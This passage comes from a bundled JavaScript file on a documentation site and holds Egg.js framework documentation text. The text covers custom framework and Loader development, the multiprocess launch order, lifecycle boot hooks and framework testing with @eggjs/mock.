`,paraId:29,tocIndex:6},{value:"As a loadUnit of framework, yadan is going to load specific directories and files, such as ",paraId:30,tocIndex:6},{value:"app",paraId:30,tocIndex:6},{value:" and ",paraId:30,tocIndex:6},{value:"config",paraId:30,tocIndex:6},{value:". Find more files loaded at ",paraId:30,tocIndex:6},{value:"Loader",paraId:31,tocIndex:6},{value:".",paraId:30,tocIndex:6},{value:"The path of framework is set as a variable named as ",paraId:32,tocIndex:7},{value:"Symbol.for('egg#eggPath')",paraId:32,tocIndex:7},{value:" to expose itself to Loader. Why? It seems that the simplest way is to pass a param to the constructor. The reason is to expose those paths of each level of inherited frameworks and reserve their sequences. Since Egg is a framework capable of unlimited inheritance, each layer has to designate their own eggPath so that all the eggPaths are accessible through the prototype chain.",paraId:32,tocIndex:7},{value:"Given a triple-layer framework: department level > enterprise level > Egg",paraId:33,tocIndex:7},{value:`// enterprise
const Application = require('egg').Application;
class Enterprise extends Application {
  get [EGG_PATH]() {
    return '/path/to/enterprise';
  }
}
// Customize Application
exports.Application = Enterprise;

// department
const Application = require('enterprise').Application;
// extend enterprise's Application
class department extends Application {
  get [EGG_PATH]() {
    return '/path/to/department';
  }
}

// the path of \`department\` have to be designated as described above
const Application = require('department').Application;
const app = new Application();
app.ready();
`,paraId:34,tocIndex:7},{value:"These code are pseudocode to elaborate the framework's loading process, and we have provided scaffolds to ",paraId:35,tocIndex:7},{value:"development",paraId:36,tocIndex:7},{value:" and ",paraId:35,tocIndex:7},{value:"deployment",paraId:37,tocIndex:7},{value:".",paraId:35,tocIndex:7},{value:"Egg's multiprocess model is composed of Application and Agent. Therefore Agent, another fundamental class similar to Application, is also required to be implemented.",paraId:38,tocIndex:8},{value:`// lib/framework.js
const path = require('path');
const egg = require('egg');
const EGG_PATH = Symbol.for('egg#eggPath');

class Application extends egg.Application {
  get [EGG_PATH]() {
    // return the path of framework
    return path.dirname(__dirname);
  }
}

class Agent extends egg.Agent {
  get [EGG_PATH]() {
    return path.dirname(__dirname);
  }
}

// rewrite Egg's Application
module.exports = Object.assign(egg, {
  Application,
  Agent,
});
`,paraId:39,tocIndex:8},{value:"To be careful about that Agent and Application based on the same Class possess different APIs.",paraId:40,tocIndex:8},{value:"Loader, the core of the launch process, is capable of loading data code, adjusting loading orders or even strengthen regulation of code.",paraId:41,tocIndex:9},{value:"As the same as Egg-Path, Loader exposes itself at ",paraId:42,tocIndex:9},{value:"Symbol.for('egg#loader')",paraId:42,tocIndex:9},{value:" to ensure it's accessibility on prototype chain.",paraId:42,tocIndex:9},{value:`// lib/framework.js
const path = require('path');
const egg = require('egg');

const EGG_PATH = Symbol.for('egg#eggPath');

class YadanAppWorkerLoader extends egg.AppWorkerLoader {
  load() {
    super.load();
    // do something
  }
}

class Application extends egg.Application {
  get [EGG_PATH]() {
    // return the path of framework
    return path.dirname(__dirname);
  }
  // supplant default Loader
  get [EGG_LOADER]() {
    return YadanAppWorkerLoader;
  }
}

// rewrite Egg's Application
module.exports = Object.assign(egg, {
  Application,
  // custom Loader, a dependence of the high level framework, needs to be exported.
  AppWorkerLoader: YadanAppWorkerLoader,
});
`,paraId:43,tocIndex:9},{value:"AgentWorkerLoader is not going to be described because of it's similarity of AppWorkerLoader, but be aware of it's located at ",paraId:44,tocIndex:9},{value:"agent.js",paraId:44,tocIndex:9},{value:" instead of ",paraId:44,tocIndex:9},{value:"app.js",paraId:44,tocIndex:9},{value:".",paraId:44,tocIndex:9},{value:"Many descriptions of launch process are scattered at ",paraId:45,tocIndex:10},{value:"Multiprocess Model",paraId:46,tocIndex:10},{value:", ",paraId:45,tocIndex:10},{value:"Loader",paraId:47,tocIndex:10},{value:" and ",paraId:45,tocIndex:10},{value:"Plugin",paraId:48,tocIndex:10},{value:", and here is a summarization.",paraId:45,tocIndex:10},{value:"startCluster",paraId:49,tocIndex:10},{value:" is invoked with ",paraId:49,tocIndex:10},{value:"baseDir",paraId:49,tocIndex:10},{value:" and ",paraId:49,tocIndex:10},{value:"framework",paraId:49,tocIndex:10},{value:", then Master process is launched.",paraId:49,tocIndex:10},{value:`Master forks a new process as Agent Worker
`,paraId:49,tocIndex:10},{value:"instantiate Agent Class of the framework loaded from path passed by the ",paraId:50,tocIndex:10},{value:"framework",paraId:50,tocIndex:10},{value:" param.",paraId:50,tocIndex:10},{value:"Agent finds out the AgentWorkerLoader and then starts to load",paraId:50,tocIndex:10},{value:"use AgentWorkerLoader to load Worker synchronously in the sequence of Plugin Config, Extend, ",paraId:50,tocIndex:10},{value:"agent.js",paraId:50,tocIndex:10},{value:" and other files.",paraId:50,tocIndex:10},{value:"The initiation of ",paraId:50,tocIndex:10},{value:"agent.js",paraId:50,tocIndex:10},{value:" is able to be customized, and it supports asynchronous launch after which it notifies Master and invoke the function passed to ",paraId:50,tocIndex:10},{value:"beforeStart",paraId:50,tocIndex:10},{value:".",paraId:50,tocIndex:10},{value:`After receiving the message that Agent Worker is launched\uFF0CMaster forks App Workers by cluster.
`,paraId:49,tocIndex:10},{value:"App Workers are multiple identical processes launched simultaneously",paraId:51,tocIndex:10},{value:"App Worker is instantiated, which is similar to Agent inherited Application class of framework loaded from framework path.",paraId:51,tocIndex:10},{value:"The same as Agent, Loading process of Application starts with AppWorkerLoader which loads files in the same order and finally informed Master.",paraId:51,tocIndex:10},{value:"After informed of launching successfully of each App Worker, Master is finally functioning.",paraId:49,tocIndex:10},{value:"You'd better read ",paraId:52,tocIndex:11},{value:"unittest",paraId:53,tocIndex:11},{value:" first, which is similar to framework testing in a quantity of situations.",paraId:52,tocIndex:11},{value:"Here are some differences between initiation of frameworks.",paraId:54,tocIndex:12},{value:`const mock = require('@eggjs/mock');
describe('test/index.test.js', () => {
  let app;
  before(() => {
    app = mock.app({
      // test/fixtures/apps/example
      baseDir: 'apps/example',
      // importent !! Do not miss
      framework: true,
    });
    return app.ready();
  });

  after(() => app.close());
  afterEach(mock.restore);

  it('should success', () => {
    return app.httpRequest().get('/').expect(200);
  });
});
`,paraId:55,tocIndex:12},{value:"Different from application testing, framework testing tests framework code instead of application code, so that baseDir varies for the propose of testing kinds of applications.",paraId:56,tocIndex:12},{value:"BaseDir is potentially considered to be under the path of ",paraId:56,tocIndex:12},{value:"test/fixtures",paraId:56,tocIndex:12},{value:", otherwise it should be absolute paths.",paraId:56,tocIndex:12},{value:"The ",paraId:56,tocIndex:12},{value:"framework",paraId:56,tocIndex:12},{value:" option is indispensable, which could be a absolute path or ",paraId:56,tocIndex:12},{value:"true",paraId:56,tocIndex:12},{value:" meaning the path of the framework to be current directory.",paraId:56,tocIndex:12},{value:"The use of the app should wait for the ",paraId:56,tocIndex:12},{value:"ready",paraId:56,tocIndex:12},{value:" event in ",paraId:56,tocIndex:12},{value:"before",paraId:56,tocIndex:12},{value:" hook, or some of the APIs is not available.",paraId:56,tocIndex:12},{value:"Do not forget to invoke ",paraId:56,tocIndex:12},{value:"app.close()",paraId:56,tocIndex:12},{value:" after testing, which could arouse the exhausting of fds, caused by unclosed log files.",paraId:56,tocIndex:12},{value:"mm.app",paraId:57,tocIndex:13},{value:" enables cache as default, which means new environment setting would not work once loaded.",paraId:57,tocIndex:13},{value:`const mock = require('@eggjs/mock');

describe('/test/index.test.js', () => {
  let app;
  afterEach(() => app.close());

  it('should test on local', () => {
    mock.env('local');
    app = mock.app({
      baseDir: 'apps/example',
      framework: true,
      cache: false,
    });
    return app.ready();
  });
  it('should test on prod', () => {
    mock.env('prod');
    app = mock.app({
      baseDir: 'apps/example',
      framework: true,
      cache: false,
    });
    return app.ready();
  });
});
`,paraId:58,tocIndex:13},{value:"Multiprocess is rarely tested because of the high cost and the unavailability of API level's mock, meanwhile, processes have a slow start or even timeout, but it still remains the most effective way of testing multiprocess model.",paraId:59,tocIndex:14},{value:"The option of ",paraId:60,tocIndex:14},{value:"mock.cluster",paraId:60,tocIndex:14},{value:" have no difference with ",paraId:60,tocIndex:14},{value:"mm.app",paraId:60,tocIndex:14},{value:" while their APIs are totally distinct, however, SuperTest still works.",paraId:60,tocIndex:14},{value:`const mock = require('@eggjs/mock');

describe('test/index.test.js', () => {
  let app;
  before(() => {
    app = mock.cluster({
      baseDir: 'apps/example',
      framework: true,
    });
    return app.ready();
  });
  after(() => app.close());
  afterEach(mock.restore);

  it('should success', () => {
    return app.httpRequest()
      .get('/')
      .expect(200);
  });
});
`,paraId:61,tocIndex:14},{value:"Tests of ",paraId:62,tocIndex:14},{value:"stdout/stderr",paraId:62,tocIndex:14},{value:" are also available, since ",paraId:62,tocIndex:14},{value:"mm.cluster",paraId:62,tocIndex:14},{value:" is based on ",paraId:62,tocIndex:14},{value:"coffee",paraId:62,tocIndex:14},{value:" in which multiprocess testing is supported.",paraId:62,tocIndex:14},{value:`const mock = require('@eggjs/mock');

describe('/test/index.test.js', () => {
  let app;
  before(() => {
    app = mock.cluster({
      baseDir: 'apps/example',
      framework: true,
    });
    return app.ready();
  });
  after(() => app.close());

  it('should get \`started\`', () => {
    // set the expectation of console
    app.expect('stdout', /started/);
  });
});
`,paraId:63,tocIndex:14}]},4711:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(82840);const t=[{value:"Loader",paraId:0},{value:"Plugin Development",paraId:1},{value:"Framework Development",paraId:2},{value:"Multi-Process Development Model Enhancement",paraId:3},{value:"View Plugin Development",paraId:4},{value:"Upgrade your event functions in your lifecycle",paraId:5}]},95570:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(19057);const t=[{value:"We've simplified the functions of our lifecycle for your convenience to control when to load application or plugins. Generally speaking, the lifecycle events can be divided into two forms:",paraId:0},{value:"Function (already deprecated, just for compatibility).",paraId:1},{value:"Class Method (recommanded).",paraId:1},{value:"beforeStart",paraId:2},{value:"We usually handle ",paraId:3,tocIndex:0},{value:"beforeStart",paraId:3,tocIndex:0},{value:" through ",paraId:3,tocIndex:0},{value:"module.export",paraId:3,tocIndex:0},{value:" with the input parameter ",paraId:3,tocIndex:0},{value:"app",paraId:3,tocIndex:0},{value:` in the app.js.
Take this as an example below:`,paraId:3,tocIndex:0},{value:`module.exports = (app) => {
  app.beforeStart(async () => {
    // Here's where your codes were before
  });
};
`,paraId:4,tocIndex:0},{value:"Now we've got some changes after upgration: We can use methods in a class in ",paraId:5,tocIndex:0},{value:"app.js",paraId:5,tocIndex:0},{value:". For application, we should write in the ",paraId:5,tocIndex:0},{value:"WillReady",paraId:5,tocIndex:0},{value:", for plugins, ",paraId:5,tocIndex:0},{value:"didLoad",paraId:5,tocIndex:0},{value:" is our choice. They look like below:",paraId:5,tocIndex:0},{value:`// app.js or agent.js:
class AppBootHook {
  constructor(app) {
    this.app = app;
  }

  async didLoad() {
    // Please put your codes of \`app.beforeStart\` here for your plugin
  }

  async willReady() {
    // Please put your codes of \`app.beforeStart\` here for your application
  }
}

module.exports = AppBootHook;
`,paraId:6,tocIndex:0},{value:"ready",paraId:2},{value:"We used to process our logic in ",paraId:7,tocIndex:1},{value:"app.ready",paraId:7,tocIndex:1},{value:":",paraId:7,tocIndex:1},{value:`module.exports = (app) => {
  app.ready(async () => {
    // Here's where your codes were before
  });
};
`,paraId:8,tocIndex:1},{value:"Now ",paraId:9,tocIndex:1},{value:"didReady",paraId:9,tocIndex:1},{value:" takes the place of it:",paraId:9,tocIndex:1},{value:`// app.js or agent.js:
class AppBootHook {
  constructor(app) {
    this.app = app;
  }

  async didReady() {
    // Please put your codes of \`app.ready\` here
  }
}

module.exports = AppBootHook;
`,paraId:10,tocIndex:1},{value:"beforeClose",paraId:2},{value:"We used to handle ",paraId:11,tocIndex:2},{value:"app.beforeClose",paraId:11,tocIndex:2},{value:" like this following:",paraId:11,tocIndex:2},{value:`module.exports = (app) => {
  app.beforeClose(async () => {
    // Here's where your codes were before
  });
};
`,paraId:12,tocIndex:2},{value:"Now we can use ",paraId:13,tocIndex:2},{value:"beforeClose",paraId:13,tocIndex:2},{value:" instead of it:",paraId:13,tocIndex:2},{value:`// app.js or agent.js:
class AppBootHook {
  constructor(app) {
    this.app = app;
  }

  async beforeClose() {
    // Please put your codes of \`app.beforeClose\` here
  }
}
`,paraId:14,tocIndex:2},{value:"In order to let you pick up quickly to replace your old functions, this torturial only tells you how to replace item by item. So if you want to know more about the whole principle of ",paraId:15,tocIndex:3},{value:"Loader",paraId:15,tocIndex:3},{value:", as well as all the functions of Egg's lifecycle, Please refer to ",paraId:15,tocIndex:3},{value:"Loader",paraId:16,tocIndex:3},{value:" and ",paraId:15,tocIndex:3},{value:"Application Startup Configuration",paraId:17,tocIndex:3},{value:".",paraId:15,tocIndex:3}]},57168:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(50343);const t=[{value:"The most importance of Egg which enhanced Koa is that it is based on a certain agreement, code will be placed in different directories according to the functional differences, it significantly reduces development costs. Loader supports this set of conventions and abstracts that many low-level APIs could be extended.",paraId:0},{value:"Egg is a low-level framework, applications could use it directly, but Egg only has a few default plugins, we need to configure plugins to extend features in application, such as MySQL.",paraId:1,tocIndex:0},{value:`// application configuration
// package.json
{
  "dependencies": {
    "egg": "^2.0.0",
    "egg-mysql": "^3.0.0"
  }
}

// config/plugin.js
module.exports = {
  mysql: {
    enable: true,
    package: 'egg-mysql',
  },
}
`,paraId:2,tocIndex:0},{value:"With the increasing number of applications, we find most of them have similar configurations, so we could extend a new framework based on Egg, which makes application configurations simpler.",paraId:3,tocIndex:0},{value:`// framework configuration
// package.json
{
  "name": "framework1",
  "version": "1.0.0",
  "dependencies": {
    "egg-mysql": "^3.0.0",
    "egg-view-nunjucks": "^2.0.0"
  }
}

// config/plugin.js
module.exports = {
  mysql: {
    enable: false,
    package: 'egg-mysql',
  },
  view: {
    enable: false,
    package: 'egg-view-nunjucks',
  }
}

// application configuration
// package.json
{
  "dependencies": {
    "framework1": "^1.0.0",
  }
}

// config/plugin.js
module.exports = {
  // enable plugins
  mysql: true,
  view: true,
}
`,paraId:4,tocIndex:0},{value:"From the scene above we can see the relationship of application, plugin and framework.",paraId:5,tocIndex:0},{value:"We implement business logics in application, and specify a framework to run, so we could configure plugin to meet a special scene feature (such as MySQL).",paraId:6,tocIndex:0},{value:"Plugin only performs specific function, when two separate functions are interdependent, they still need to be separated into two plugins, and requires configuration.",paraId:6,tocIndex:0},{value:"Framework is a launcher (default is Egg), which is indispensable to run. Framework is also a wrapper, it aggregates plugins to provide functions unitedly, and it can also configure plugins.",paraId:6,tocIndex:0},{value:"We can extend a new framework based on framework, which means that ",paraId:6,tocIndex:0},{value:"framework can be inherited infinitely",paraId:6,tocIndex:0},{value:", like class inheritance.",paraId:6,tocIndex:0},{value:`+-----------------------------------+--------+
|      app1, app2, app3, app4       |        |
+-----+--------------+--------------+        |
|     |              |  framework3  |        |
+     |  framework1  +--------------+ plugin |
|     |              |  framework2  |        |
+     +--------------+--------------+        |
|                   Egg             |        |
+-----------------------------------+--------|
|                   Koa                      |
+-----------------------------------+--------+
`,paraId:7,tocIndex:0},{value:"Egg regards application, framework and plugin as loadUnit, because they are similar in code structure, here is the directory structure:",paraId:8,tocIndex:1},{value:`loadUnit
\u251C\u2500\u2500 package.json
\u251C\u2500\u2500 app.js
\u251C\u2500\u2500 agent.js
\u251C\u2500\u2500 app
\u2502   \u251C\u2500\u2500 extend
\u2502   |   \u251C\u2500\u2500 helper.js
\u2502   |   \u251C\u2500\u2500 request.js
\u2502   |   \u251C\u2500\u2500 response.js
\u2502   |   \u251C\u2500\u2500 context.js
\u2502   |   \u251C\u2500\u2500 application.js
\u2502   |   \u2514\u2500\u2500 agent.js
\u2502   \u251C\u2500\u2500 service
\u2502   \u251C\u2500\u2500 middleware
\u2502   \u2514\u2500\u2500 router.js
\u2514\u2500\u2500 config
    \u251C\u2500\u2500 config.default.js
    \u251C\u2500\u2500 config.prod.js
    \u251C\u2500\u2500 config.test.js
    \u251C\u2500\u2500 config.local.js
    \u2514\u2500\u2500 config.unittest.js
`,paraId:9,tocIndex:1},{value:"However, there are still some differences:",paraId:10,tocIndex:1},{value:"File",paraId:11,tocIndex:1},{value:"Application",paraId:11,tocIndex:1},{value:"Framework",paraId:11,tocIndex:1},{value:"Plugin",paraId:11,tocIndex:1},{value:"app/router.js",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"app/controller",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"app/middleware",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"app/service",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"app/extend",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"app.js",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"agent.js",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"config/config.{env}.js",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"config/plugin.js",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"package.json",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"\u2714\uFE0E",paraId:11,tocIndex:1},{value:"During the loading process, Egg will traverse all loadUnits to load the files above(application, framework and plugin are different), the loading process has priority.",paraId:12,tocIndex:1},{value:"Load according to ",paraId:13,tocIndex:1},{value:"Plugin => Framework => Application",paraId:13,tocIndex:1},{value:".",paraId:13,tocIndex:1},{value:"The order of loading plugin depends on the dependencies, dependent plugins will be loaded first, independent plugins are loaded by the object key configuration order, see ",paraId:13,tocIndex:1},{value:"Plugin",paraId:14,tocIndex:1},{value:" for details.",paraId:13,tocIndex:1},{value:"Frameworks are loaded by the order of inheritance, the lower the more priority.",paraId:13,tocIndex:1},{value:"For example, an application is configured with the following dependencies:",paraId:15,tocIndex:1},{value:`app
| \u251C\u2500\u2500 plugin2 (depends plugin3)
| \u2514\u2500\u2500 plugin3
\u2514\u2500\u2500 framework1
    | \u2514\u2500\u2500 plugin1
    \u2514\u2500\u2500 egg
`,paraId:16,tocIndex:1},{value:"The final loading order is:",paraId:17,tocIndex:1},{value:`=> plugin1
=> plugin3
=> plugin2
=> egg
=> framework1
=> app
`,paraId:18,tocIndex:1},{value:"The plugin1 is framework1's dependent plugin, the object key order of plugin1 after configuration merger is prior to plugin2/plugin3. Because of the dependencies between plugin2 and plugin3, the order is swapped. The framework1 inherits the Egg, so the order is after the egg. The application is the last to be loaded.",paraId:19,tocIndex:1},{value:"See ",paraId:20,tocIndex:1},{value:"Loader.getLoadUnits",paraId:20,tocIndex:1},{value:" method for details.",paraId:20,tocIndex:1},{value:"The files that will be loaded by default are listed above. Egg will load files by the following order, each file or directory will be loaded according to loadUnit order (application, framework and plugin are different):",paraId:21,tocIndex:2},{value:"Loading ",paraId:22,tocIndex:2},{value:"plugin",paraId:23,tocIndex:2},{value:", find application and framework, loading ",paraId:22,tocIndex:2},{value:"config/plugin.js",paraId:22,tocIndex:2},{value:"Loading ",paraId:22,tocIndex:2},{value:"config",paraId:24,tocIndex:2},{value:", traverse loadUnit to load ",paraId:22,tocIndex:2},{value:"config/config.{env}.js",paraId:22,tocIndex:2},{value:"Loading ",paraId:22,tocIndex:2},{value:"extend",paraId:25,tocIndex:2},{value:", traverse loadUnit to load ",paraId:22,tocIndex:2},{value:"app/extend/xx.js",paraId:22,tocIndex:2},{value:"Application startup configuration",paraId:26,tocIndex:2},{value:", traverse loadUnit to load ",paraId:22,tocIndex:2},{value:"app.js",paraId:22,tocIndex:2},{value:" and ",paraId:22,tocIndex:2},{value:"agent.js",paraId:22,tocIndex:2},{value:"Loading ",paraId:22,tocIndex:2},{value:"service",paraId:27,tocIndex:2},{value:", traverse loadUnit to load ",paraId:22,tocIndex:2},{value:"app/service",paraId:22,tocIndex:2},{value:" directory",paraId:22,tocIndex:2},{value:"Loading ",paraId:22,tocIndex:2},{value:"middleware",paraId:28,tocIndex:2},{value:", traverse loadUnit to load ",paraId:22,tocIndex:2},{value:"app/middleware",paraId:22,tocIndex:2},{value:" directory",paraId:22,tocIndex:2},{value:"Loading ",paraId:22,tocIndex:2},{value:"controller",paraId:29,tocIndex:2},{value:", loading application's ",paraId:22,tocIndex:2},{value:"app/controller",paraId:22,tocIndex:2},{value:" directory",paraId:22,tocIndex:2},{value:"Loading ",paraId:22,tocIndex:2},{value:"router",paraId:30,tocIndex:2},{value:", loading application's ",paraId:22,tocIndex:2},{value:"app/router.js",paraId:22,tocIndex:2},{value:"Note:",paraId:31,tocIndex:2},{value:"Same name will be override in loading, for example, if we want to override ",paraId:32,tocIndex:2},{value:"ctx.ip",paraId:32,tocIndex:2},{value:" we could define ip in application's ",paraId:32,tocIndex:2},{value:"app/extend/context.js",paraId:32,tocIndex:2},{value:" directly.",paraId:32,tocIndex:2},{value:"See ",paraId:32,tocIndex:2},{value:"framework development",paraId:33,tocIndex:2},{value:" for detail application launch order.",paraId:32,tocIndex:2},{value:"The framework has provided you several functions to handle during the whole life cycle:",paraId:34,tocIndex:3},{value:"configWillLoad",paraId:35,tocIndex:3},{value:": All the config files are ready to load, so this is the LAST chance to modify them.",paraId:35,tocIndex:3},{value:"configDidLoad",paraId:35,tocIndex:3},{value:": When all the config files have been loaded.",paraId:35,tocIndex:3},{value:"didLoad",paraId:35,tocIndex:3},{value:": When all the files have been loaded.",paraId:35,tocIndex:3},{value:"willReady",paraId:35,tocIndex:3},{value:": When all the plugins are ready.",paraId:35,tocIndex:3},{value:"didReady",paraId:35,tocIndex:3},{value:": When all the workers are ready.",paraId:35,tocIndex:3},{value:"serverDidReady",paraId:35,tocIndex:3},{value:": When the server is ready.",paraId:35,tocIndex:3},{value:"beforeClose",paraId:35,tocIndex:3},{value:": Before the application is closed.",paraId:35,tocIndex:3},{value:"Here're the definations:",paraId:36,tocIndex:3},{value:`// app.js or agent.js
class AppBootHook {
  constructor(app) {
    this.app = app;
  }

  configWillLoad() {
    // Ready to call configDidLoad,
    // Config, plugin files are referred,
    // this is the last chance to modify the config.
  }

  configDidLoad() {
    // Config, plugin files have been loaded.
  }

  async didLoad() {
    // All files have loaded, start plugin here.
  }

  async willReady() {
    // All plugins have started, can do some thing before app ready
  }

  async didReady() {
    // Worker is ready, can do some things
    // don't need to block the app boot.
  }

  async serverDidReady() {
    // Server is listening.
  }

  async beforeClose() {
    // Do some thing before app close.
  }
}

module.exports = AppBootHook;
`,paraId:37,tocIndex:3},{value:"The framework will automatically load and initialize this class after developers have defined ",paraId:38,tocIndex:3},{value:"app.js",paraId:38,tocIndex:3},{value:" and ",paraId:38,tocIndex:3},{value:"agenet.js",paraId:38,tocIndex:3},{value:" in the form of class, and it will call the corresponding methods during each of the life cycles.",paraId:38,tocIndex:3},{value:"Here's the image of starting process:",paraId:39,tocIndex:3},{value:"Notice: We have an expiring time limitation when using ",paraId:40,tocIndex:3},{value:"beforeClose",paraId:40,tocIndex:3},{value:" to close the processing of the framework. If a worker has accepted the signal of exit but doesn't exit within the limit period, it will be FORCELY closed.",paraId:40,tocIndex:3},{value:"If you need to modify the expiring time, please see ",paraId:41,tocIndex:3},{value:"this document",paraId:41,tocIndex:3},{value:".",paraId:41,tocIndex:3},{value:"Deprecated methods:",paraId:42,tocIndex:3},{value:"beforeStart",paraId:43},{value:"beforeStart",paraId:44,tocIndex:4},{value:" is called during the loading process, all of its methods are running in parallel. So we usually execute some asynchronized methods (e.g: Check the state of connection, in ",paraId:44,tocIndex:4},{value:"egg-mysql",paraId:44,tocIndex:4},{value:" we use this method to check the connection state with mysql). When all the tasks in ",paraId:44,tocIndex:4},{value:"beforeStart",paraId:44,tocIndex:4},{value:" finished, the state will be ",paraId:44,tocIndex:4},{value:"ready",paraId:44,tocIndex:4},{value:". It's NOT recommended to excute a function that consumes too much time there, which will cause the expiration of application's start.plugin developers should use ",paraId:44,tocIndex:4},{value:"didLoad",paraId:44,tocIndex:4},{value:" instead, for application developers, ",paraId:44,tocIndex:4},{value:"willReady",paraId:44,tocIndex:4},{value:" is the replacer.",paraId:44,tocIndex:4},{value:"ready",paraId:43},{value:"All the methods mounted on ",paraId:45,tocIndex:5},{value:"ready",paraId:45,tocIndex:5},{value:" will be executed when load ends, and after all the methods in ",paraId:45,tocIndex:5},{value:"beforeStart",paraId:45,tocIndex:5},{value:" have finished executing. By the time Http server's listening also starts. This means all the plugins are fully loaded and everything is ready, So we use it to process some tasks after start. For developers now, we use ",paraId:45,tocIndex:5},{value:"didReady",paraId:45,tocIndex:5},{value:" instead.",paraId:45,tocIndex:5},{value:"beforeClose",paraId:43},{value:"All the methods mounted on ",paraId:46,tocIndex:6},{value:"beforeClose",paraId:46,tocIndex:6},{value:" are called in an inverted order after ",paraId:46,tocIndex:6},{value:"close",paraId:46,tocIndex:6},{value:" method in app/agent instance is called. E.g: in ",paraId:46,tocIndex:6},{value:"egg",paraId:46,tocIndex:6},{value:", we close logger, remove listening methods ...,ect.Developers SHOULDN'T use ",paraId:46,tocIndex:6},{value:"app.beforeClose",paraId:46,tocIndex:6},{value:" directly now, but in the form of class to implement ",paraId:46,tocIndex:6},{value:"beforeClose",paraId:46,tocIndex:6},{value:" instead.",paraId:46,tocIndex:6},{value:"We don't recommend to use this function in a PROD env, because the process may end before it finishes.",paraId:47,tocIndex:6},{value:"What's more, we can use ",paraId:48,tocIndex:6},{value:"egg-development",paraId:48,tocIndex:6},{value:" to see the loading process.",paraId:48,tocIndex:6},{value:"The framework will convert file names when loading files, because there is a difference between the file naming style and the API style. We recommend that files use underscores, while APIs use lower camel case. For examplem ",paraId:49,tocIndex:7},{value:"app/service/user_info.js",paraId:49,tocIndex:7},{value:" will be converted to ",paraId:49,tocIndex:7},{value:"app.service.userInfo",paraId:49,tocIndex:7},{value:".",paraId:49,tocIndex:7},{value:"The framework also supports hyphens and camel case:",paraId:50,tocIndex:7},{value:"app/service/user-info.js",paraId:51,tocIndex:7},{value:" => ",paraId:51,tocIndex:7},{value:"app.service.userInfo",paraId:51,tocIndex:7},{value:"app/service/userInfo.js",paraId:51,tocIndex:7},{value:" => ",paraId:51,tocIndex:7},{value:"app.service.userInfo",paraId:51,tocIndex:7},{value:"Loader also provides ",paraId:52,tocIndex:7},{value:"caseStyle",paraId:53,tocIndex:7},{value:" to force the first letter case, such as make the first letter of the API upper case when loading the model, ",paraId:52,tocIndex:7},{value:"app/model/user.js",paraId:52,tocIndex:7},{value:" => ",paraId:52,tocIndex:7},{value:"app.model.User",paraId:52,tocIndex:7},{value:", we can set ",paraId:52,tocIndex:7},{value:"caseStyle: 'upper'",paraId:52,tocIndex:7},{value:".",paraId:52,tocIndex:7},{value:"[Loader] is a base class and provides some built-in methods based on the rules of the file loading, but itself does not call them in most cases, inherited classes call those methods.",paraId:54,tocIndex:8},{value:"loadPlugin()",paraId:55,tocIndex:8},{value:"loadConfig()",paraId:55,tocIndex:8},{value:"loadAgentExtend()",paraId:55,tocIndex:8},{value:"loadApplicationExtend()",paraId:55,tocIndex:8},{value:"loadRequestExtend()",paraId:55,tocIndex:8},{value:"loadResponseExtend()",paraId:55,tocIndex:8},{value:"loadContextExtend()",paraId:55,tocIndex:8},{value:"loadHelperExtend()",paraId:55,tocIndex:8},{value:"loadCustomAgent()",paraId:55,tocIndex:8},{value:"loadCustomApp()",paraId:55,tocIndex:8},{value:"loadService()",paraId:55,tocIndex:8},{value:"loadMiddleware()",paraId:55,tocIndex:8},{value:"loadController()",paraId:55,tocIndex:8},{value:"loadRouter()",paraId:55,tocIndex:8},{value:"Egg implements [AppWorkerLoader] and [AgentWorkerLoader] based on the Loader, inherited frameworks could make extensions based on these two classes, and ",paraId:56,tocIndex:8},{value:"Extensions of the Loader can only be done in the framework",paraId:56,tocIndex:8},{value:".",paraId:56,tocIndex:8},{value:`// custom AppWorkerLoader
// lib/framework.js
const path = require('path');
const egg = require('egg');
const EGG_PATH = Symbol.for('egg#eggPath');

class YadanAppWorkerLoader extends egg.AppWorkerLoader {
  constructor(opt) {
    super(opt);
    // custom initialization
  }

  loadConfig() {
    super.loadConfig();
    // process config
  }

  load() {
    super.load();
    // custom loading other directories
    // or processing loaded files
  }
}

class Application extends egg.Application {
  get [EGG_PATH]() {
    return path.dirname(__dirname);
  }
  // override Egg's Loader, use this Loader when launching
  get [EGG_LOADER]() {
    return YadanAppWorkerLoader;
  }
}

module.exports = Object.assign(egg, {
  Application,
  // custom Loader also need export, inherited framework make extensions based on it
  AppWorkerLoader: YadanAppWorkerLoader,
});
